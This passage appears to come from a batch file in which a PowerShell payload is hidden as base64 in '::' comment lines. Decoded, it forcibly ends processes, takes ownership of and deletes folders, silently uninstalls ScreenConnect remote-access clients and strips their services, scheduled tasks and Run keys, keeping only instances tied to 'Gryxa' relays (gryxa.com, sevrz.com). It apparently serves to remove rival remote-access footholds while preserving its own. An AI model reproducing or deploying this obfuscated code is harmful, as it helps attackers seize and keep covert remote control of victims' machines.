::CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5FeGVjdXRhYmxlUGF0aC5TdGFy
::dHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJZ25vcmVDYXNl
::KSB9IHwNCiAgICAgICAgICAgIEZvckVhY2gtT2JqZWN0IHsgU3RvcC1Qcm9jZXNz
::IC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlIH0NCiAgICAgICAgIyB1bi1oYXJkIHNlbGYtcHJvdGVjdGVkIGRpcnMg
::KGZvcmVpZ24vb2xkIFNDIGxvY2tzIEFDTHMrYXR0cnMgdG8gc3Vydml2ZSByZW1v
::dmFsKQ0KICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkgMj4mMSB8
::IE91dC1OdWxsDQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvcmVzZXQgL1QgL0Mg
::L1EgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAt
::aCAtcyAtciAvcyAvZCBgIiRkYCIgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxs
::DQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJypTLTEtNS0zMi01NDQ6
::KE9JKShDSSlGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBp
::Y2FjbHMuZXhlICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGJyAv
::VCAvQyAvUSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBpY2FjbHMuZXhlICRk
::IC9ncmFudCAnU1lTVEVNOihPSSkoQ0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJz
::ZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAg
::aWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsNCiAgICAgICAgICAgIGNt
::ZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAvcyAvZCBgIiRkXCouKmAiIiAyPiYx
::IHwgT3V0LU51bGwNCiAgICAgICAgICAgIGNtZC5leGUgL2MgInJtZGlyIC9zIC9x
::IGAiJGRgIiIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIH0NCiAgICAgICAgaWYg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsNCiAgICAgICAgICAgICRlbXB0
::eSA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6
::TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpDQogICAgICAgICAgICBOZXctSXRlbSAt
::SXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRlbXB0eSAtRm9yY2UgfCBPdXQtTnVs
::bA0KICAgICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5ICRkIC9NSVIgL1I6
::MCAvVzowIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0g
::LUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUNCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAk
::ZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRl
::cmFsUGF0aCAkZCkNCiAgICB9DQogICAgZnVuY3Rpb24gVW5pbnN0YWxsLVByb2R1
::Y3RLZXkoJGtleSkgew0KICAgICAgICAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWUN
::CiAgICAgICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICRkbiA9ICRwcm9w
::LkRpc3BsYXlOYW1lDQogICAgICAgICMgTDM5L0w0NDogcmVmdXNlIC94IGlmIERp
::c3BsYXlOYW1lIEZQIGlzIGEga2VlcGVyIE9SIEdyeXhhIFByb2R1Y3RDb2RlIChz
::aGFyZWQgR1VJRCBraWxscyBHdWVzdCkNCiAgICAgICAgaWYgKCRndWlkIC1lcSAn
::ezlEN0NDNDE4LUEzNTYtOTY5My1EQ0M1LTQxRUM0NEQwM0IzMX0nKSB7DQogICAg
::ICAgICAgICBMb2cgInByb2R1Y3Rfc2tpcF9ncnl4YV9wcm9kdWN0Y29kZSBndWlk
::PSRndWlkIg0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQog
::ICAgICAgIGlmICgkZG4gLW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVudCBcKChb
::MC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICAkZnBEbiA9ICRNYXRj
::aGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcERuIC1pbiAka2Vl
::cCAtb3IgKFRlc3QtSXNHcnl4YUZwICRmcERuKSkgew0KICAgICAgICAgICAgICAg
::IExvZyAicHJvZHVjdF9za2lwX2tlZXBlcl9mcCBbJGRuXSBndWlkPSRndWlkIg0K
::ICAgICAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfQ0KICAgICAgICBpZiAoJGd1aWQgLWxpa2UgJ3sqfScpIHsNCiAgICAg
::ICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRM
::aXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJl
::c3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuDQogICAgICAg
::ICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRndWlkIGV4aXQ9
::JCgkcC5FeGl0Q29kZSkiDQogICAgICAgICAgICBpZiAoJHAuRXhpdENvZGUgLWlu
::IDAsIDE2MDUsIDE2MTQsIDMwMTApIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAg
::fQ0KICAgICAgICAkdXMgPSAkcHJvcC5Vbmluc3RhbGxTdHJpbmcNCiAgICAgICAg
::aWYgKCR1cykgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBp
::ZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7DQogICAgICAgICAgICAgICAg
::ICAgICRhcmdzID0gKCR1cyAtcmVwbGFjZSAnKD9pKV4uKm1zaWV4ZWMoXC5leGUp
::P1xzKicsICcnKQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJGFyZ3MgLW5vdG1h
::dGNoICcvcW4nKSB7ICRhcmdzID0gIiRhcmdzIC9xbiAvbm9yZXN0YXJ0IiB9DQog
::ICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4
::ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5
::bGUgSGlkZGVuDQogICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmlu
::c3RhbGxzdHJpbmdfbXNpIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAg
::ICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUs
::IDE2MTQsIDMwMTApDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAg
::ICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50
::TGlzdCAiL2MgJHVzIC9TIC9zaWxlbnQgL3F1aWV0IC9xbiIgLVdhaXQgLVBhc3NU
::aHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAgICAgICAgICAgICAgICAgICAgTG9n
::ICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4
::aXRDb2RlKSINCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29k
::ZSAtZXEgMCkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNo
::IHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlMIFskZG5dICRfIiB9
::DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAg
::ICMg4pSA4pSAIGRlc3Ryb3kgZm9yZWlnbi9vbGQgU0MgcGVyc2lzdGVuY2UgKHdh
::dGNoZG9nIHRhc2tzICsgcnVuIGtleXMpIOKUgOKUgA0KICAgICMgUm9vdCBjYXVz
::ZSBvZiAiY29ubmVjdHMgdGhlbiBkcm9wcyI6IGEgbm9uLWtlZXBlciAvIG9sZC1G
::UCBTY3JlZW5Db25uZWN0IGtlZXBzIGENCiAgICAjIHNjaGVkdWxlZCB0YXNrIG9y
::IFJ1biBrZXkgdGhhdCByZS1ydW5zIGl0cyBjYWNoZWQgbXNpZXhlYyAvaS4gRXZl
::cnkgc3VjaCAvaSBmaXJlcw0KICAgICMgUmVtb3ZlRXhpc3RpbmdQcm9kdWN0cyBv
::biB0aGUgU0hBUkVEIFNDIFVwZ3JhZGVDb2RlIGFuZCBzdHJpcHMgdGhlIGtlZXBl
::ciBHcnl4YS4NCiAgICAjIFJlbW92aW5nIG9ubHkgdGhlIHByb2R1Y3QgaXMgbm90
::IGVub3VnaCDigJQgdGhlIHBlcnNpc3RlbmNlIHJlaW5zdGFsbHMgaXQgKGFuZCBr
::aWxscw0KICAgICMgR3J5eGEgYWdhaW4pLiBQdXJnZSB0aGUgcGVyc2lzdGVuY2Ug
::RklSU1Qgc28gcHJvZHVjdC9zdmMvZGlyIHJlbW92YWwgaXMgcGVybWFuZW50Lg0K
::ICAgIGZ1bmN0aW9uIEdldC1Ob25LZWVwZXJTY0ZwcyB7DQogICAgICAgICRmcHMg
::PSBAe30NCiAgICAgICAgR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8u
::TmFtZSAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlhLWZBLUZd
::ezE2fSlcKScpIHsNCiAgICAgICAgICAgICAgICAkZnBzWyRtYXRjaGVzWzFdLlRv
::TG93ZXIoKV0gPSAkdHJ1ZQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAg
::ICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUg
::bGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgiJChbc3Ry
::aW5nXSRfLkV4ZWN1dGFibGVQYXRoKSAkKFtzdHJpbmddJF8uQ29tbWFuZExpbmUp
::IiAtbWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAgICAgICAgICAg
::ICAgICAkZnBzWyRtYXRjaGVzWzFdLlRvTG93ZXIoKV0gPSAkdHJ1ZQ0KICAgICAg
::ICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRyb290IGluICRz
::Y3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAgICAgIGlmICgtbm90IChU
::ZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIEdldC1D
::aGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
::b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGRuID0gKEdldC1JdGVt
::UHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::KS5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgICAgIGlmICgkZG4gLW1hdGNoICdT
::Y3JlZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7ICRm
::cHNbJG1hdGNoZXNbMV0uVG9Mb3dlcigpXSA9ICR0cnVlIH0NCiAgICAgICAgICAg
::IH0NCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6
::UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAg
::ICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNl
::KSkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRl
::cmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAg
::ICBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFsw
::LTlhLWZBLUZdezE2fSlcKScpIHsgJGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCld
::ID0gJHRydWUgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIEAo
::JGZwcy5LZXlzIHwgV2hlcmUtT2JqZWN0IHsgJF8gLW5vdGluICRrZWVwIH0pDQog
::ICAgfQ0KDQogICAgZnVuY3Rpb24gVGVzdC1TY0tlZXBlclJlZihbc3RyaW5nXSRz
::KSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0KICAg
::ICAgICBpZiAoJHMgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbXxzZXZyelwuY29tJykg
::eyByZXR1cm4gJHRydWUgfQ0KICAgICAgICBpZiAoJHMgLW1hdGNoICcoP2kpb3du
::KF9tb258X2xpYnxfc2VjdXJlKT9cLihjbWR8cHMxKXxncnl4YV9ib290fFwud3Vj
::YWNoZScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4g
::JGtlZXApIHsgaWYgKCRrIC1hbmQgJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAk
::dHJ1ZSB9IH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAgIGZ1
::bmN0aW9uIFJlbW92ZS1TY1BlcnNpc3RlbmNlKFtzdHJpbmddJEZwKSB7DQogICAg
::ICAgICMgTDM5OiBwdXJnZSBTY3JlZW5Db25uZWN0IHBlcnNpc3RlbmNlIHJlZmVy
::ZW5jaW5nIHRoaXMgRlAgT1IgZ2VuZXJpYyBTQyBpbnN0YWxsZXJzDQogICAgICAg
::ICMgdGhhdCBhcmUgbm90IGtlZXBlci1wcm90ZWN0ZWQgKGJhcmUgbXNpZXhlYyAv
::aSBVUkwgd2F0Y2hkb2dzIHdpdGhvdXQgRlAgbGl0ZXJhbCkuDQogICAgICAgIHRy
::eSB7DQogICAgICAgICAgICBHZXQtU2NoZWR1bGVkVGFzayAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAg
::ICAgICAkdGFzayA9ICRfDQogICAgICAgICAgICAgICAgJGJsb2IgPSAnJw0KICAg
::ICAgICAgICAgICAgIGZvcmVhY2ggKCRhIGluICR0YXNrLkFjdGlvbnMpIHsgJGJs
::b2IgKz0gIiAkKCRhLkV4ZWN1dGUpICQoJGEuQXJndW1lbnRzKSIgfQ0KICAgICAg
::ICAgICAgICAgIGlmICgkYmxvYiAtbm90bWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0
::fG1zaWV4ZWMnKSB7IHJldHVybiB9DQogICAgICAgICAgICAgICAgaWYgKFRlc3Qt
::U2NLZWVwZXJSZWYgJGJsb2IpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICAgICAk
::aGl0ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgaWYgKCRGcCAtYW5kICRibG9i
::IC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJEZwKSkgeyAkaGl0ID0gJHRydWUgfQ0K
::ICAgICAgICAgICAgICAgIGVsc2VpZiAoJGJsb2IgLW1hdGNoICcoP2kpU2NyZWVu
::Q29ubmVjdFwuQ2xpZW50U2V0dXB8U2NyZWVuQ29ubmVjdCBDbGllbnR8cGtnX2dy
::eXhhXC5tc2l8cGtnXC5tc2knKSB7ICRoaXQgPSAkdHJ1ZSB9DQogICAgICAgICAg
::ICAgICAgaWYgKCRoaXQpIHsNCiAgICAgICAgICAgICAgICAgICAgVW5yZWdpc3Rl
::ci1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAkdGFzay5UYXNrTmFtZSAtVGFza1Bh
::dGggJHRhc2suVGFza1BhdGggLUNvbmZpcm06JGZhbHNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIExvZyAicGVyc2lz
::dF90YXNrX3JlbW92ZWQgJCgkdGFzay5UYXNrUGF0aCkkKCR0YXNrLlRhc2tOYW1l
::KSBmcD0kRnAiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAg
::ICAgICB9IGNhdGNoIHsgTG9nICJwZXJzaXN0X3Rhc2tfZW51bV9lcnIgJF8iIH0N
::CiAgICAgICAgZm9yZWFjaCAoJHJrIGluIEAoJ0hLTE06XFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bicsDQogICAgICAgICAgICAg
::ICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxSdW5PbmNlJywNCiAgICAgICAgICAgICAgICAgICAgICAg
::ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dz
::XEN1cnJlbnRWZXJzaW9uXFJ1bicsDQogICAgICAgICAgICAgICAgICAgICAgICAg
::ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxSdW5PbmNlJywNCiAgICAgICAgICAgICAgICAgICAgICAg
::ICAgJ0hLQ1U6XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
::aW9uXFJ1bicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICdIS0NVOlxTT0ZU
::V0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlJykp
::IHsNCiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJrKSkgeyBjb250
::aW51ZSB9DQogICAgICAgICAgICAkcCA9IEdldC1JdGVtUHJvcGVydHkgJHJrIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBpZiAoLW5v
::dCAkcCkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBmb3JlYWNoICgkcHJvcCBp
::biAkcC5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgaWYg
::KCRwcm9wLk5hbWUgLWxpa2UgJ1BTKicpIHsgY29udGludWUgfQ0KICAgICAgICAg
::ICAgICAgICR2ID0gW3N0cmluZ10kcHJvcC5WYWx1ZQ0KICAgICAgICAgICAgICAg
::IGlmIChUZXN0LVNjS2VlcGVyUmVmICR2KSB7IGNvbnRpbnVlIH0NCiAgICAgICAg
::ICAgICAgICBpZiAoJHYgLW5vdG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdHxtc2ll
::eGVjJykgeyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgJGhpdCA9ICRmYWxz
::ZQ0KICAgICAgICAgICAgICAgIGlmICgkRnAgLWFuZCAkdiAtbWF0Y2ggW3JlZ2V4
::XTo6RXNjYXBlKCRGcCkpIHsgJGhpdCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAg
::ICBlbHNlaWYgKCR2IC1tYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RcLkNsaWVudFNl
::dHVwfFNjcmVlbkNvbm5lY3QgQ2xpZW50JykgeyAkaGl0ID0gJHRydWUgfQ0KICAg
::ICAgICAgICAgICAgIGlmICgkaGl0KSB7DQogICAgICAgICAgICAgICAgICAgIFJl
::bW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJHJrIC1OYW1lICRwcm9wLk5hbWUgLUZv
::cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAg
::ICAgICAgIExvZyAicGVyc2lzdF9ydW5rZXlfcmVtb3ZlZCAkcmtcJCgkcHJvcC5O
::YW1lKSBmcD0kRnAiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0K
::ICAgICAgICB9DQogICAgfQ0KDQogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVf
::TDdfYmVnaW4nDQoNCiAgICAjIHB1cmdlIHBlcnNpc3RlbmNlIGZvciBldmVyeSBu
::b24ta2VlcGVyIFNDIGZpbmdlcnByaW50IEJFRk9SRSBwcm9kdWN0L3N2Yy9kaXIg
::cmVtb3ZhbCwNCiAgICAjIHNvIGFuIG9sZC9mb3JlaWduIFNDIHdhdGNoZG9nIGNh
::bm5vdCByZWluc3RhbGwgaXRzZWxmIChhbmQgY3Jvc3Mta2lsbCBHcnl4YSkgbWlk
::LXBhc3MuDQogICAgZm9yZWFjaCAoJGZwWCBpbiAoR2V0LU5vbktlZXBlclNjRnBz
::KSkgew0KICAgICAgICBSZW1vdmUtU2NQZXJzaXN0ZW5jZSAkZnBYDQogICAgfQ0K
::DQogICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0
::IEFSUCBoaXZlcw0KICAgICRzZWVuID0gQHt9DQogICAgZm9yZWFjaCAoJHJvb3Qg
::aW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2luZyAkcm9vdCI7IGNv
::bnRpbnVlIH0NCiAgICAgICAgTG9nICJoaXZlX3NjYW4gJHJvb3QiDQogICAgICAg
::IEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkcHJvcCA9IEdldC1J
::dGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlDQogICAgICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQ0KICAgICAg
::ICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAo
::JGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChb
::MC05QS1GYS1mXXsxNn0pXCknKSB7IHJldHVybiB9DQogICAgICAgICAgICAkZnAg
::PSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnAgLWlu
::ICRrZWVwKSB7IHJldHVybiB9DQogICAgICAgICAgICAkdXMgPSAkcHJvcC5Vbmlu
::c3RhbGxTdHJpbmcNCiAgICAgICAgICAgIGlmICgkdXMgLWFuZCAkdXMgLW1hdGNo
::ICcoP2kpZ3J5eGFcLmNvbScpIHsgTG9nICJwcm9kdWN0X3NraXBfZ3J5eGFfcmVs
::YXkgWyRkbl0iOyByZXR1cm4gfQ0KICAgICAgICAgICAgaWYgKCRzZWVuLkNvbnRh
::aW5zS2V5KCRfLlBTQ2hpbGROYW1lKSkgeyByZXR1cm4gfQ0KICAgICAgICAgICAg
::JHNlZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUNCiAgICAgICAgICAgIGlmIChV
::bmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsg
::JG4uZmFpbCsrOyBMb2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQ0K
::ICAgICAgICB9DQogICAgfQ0KDQogICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2Vz
::IChza2lwIGlmIGtlZXBlciBGUCBvciByZWxheSBpcyBncnl4YS5jb20pDQogICAg
::Zm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3Jl
::ZW5Db25uZWN0IENsaWVudConIH0pKSB7DQogICAgICAgIGlmIChJcy1LZWVwZXIg
::JHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgJGltZyA9IChHZXQtSXRl
::bVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vydmlj
::ZXNcJCgkc3ZjLk5hbWUpIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSku
::SW1hZ2VQYXRoDQogICAgICAgIGlmIChJcy1LZWVwZXIgJGltZykgeyBMb2cgInN2
::Y19za2lwX2dyeXhhX3JlbGF5ICQoJHN2Yy5OYW1lKSI7IGNvbnRpbnVlIH0NCiAg
::ICAgICAgJiBzYy5leGUgc3RvcCAiJCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51
::bGwNCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDANCiAgICAg
::ICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVs
::bA0KICAgICAgICAkbi5zdmMrKzsgTG9nICJzdmNfZGVsZXRlZCAkKCRzdmMuTmFt
::ZSkiDQogICAgfQ0KDQogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nlc3NlcyDigJQg
::T05MWSBpZiBwYXRoL2NtZGxpbmUgZW1iZWRzIGEgTk9OLWtlZXBlciBGUC4NCiAg
::ICAjIE80MTogbnVsbCBFeGVjdXRhYmxlUGF0aCB1c2VkIHRvIGtpbGwgR3J5eGEg
::Q2xpZW50U2VydmljZSBldmVyeSB0aWNrIOKGkiByZWluc3RhbGwgbG9vcC4NCiAg
::ICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxp
::a2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRleGUgPSBbc3RyaW5nXSRf
::LkV4ZWN1dGFibGVQYXRoDQogICAgICAgICRjbWQgPSBbc3RyaW5nXSRfLkNvbW1h
::bmRMaW5lDQogICAgICAgICRibG9iID0gIiRleGUgJGNtZCINCiAgICAgICAgaWYg
::KElzLUtlZXBlciAkYmxvYikgeyByZXR1cm4gfQ0KICAgICAgICBpZiAoJGJsb2Ig
::LW1hdGNoICcoP2kpZ3J5eGFcLmNvbScpIHsgTG9nICJwcm9jX3NraXBfZ3J5eGFf
::cmVsYXkgcGlkPSQoJF8uUHJvY2Vzc0lkKSI7IHJldHVybiB9DQogICAgICAgIGlm
::ICgkYmxvYiAtbm90bWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAg
::ICAgICAgICAgIExvZyAicHJvY19za2lwX25vX2ZwIHBpZD0kKCRfLlByb2Nlc3NJ
::ZCkgbmFtZT0kKCRfLk5hbWUpIg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAg
::IH0NCiAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAg
::IGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9DQogICAgICAgIFN0b3AtUHJv
::Y2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQg
::cGlkPSQoJF8uUHJvY2Vzc0lkKSBmcD0kZnAgZXhlPSRleGUiDQogICAgfQ0KDQog
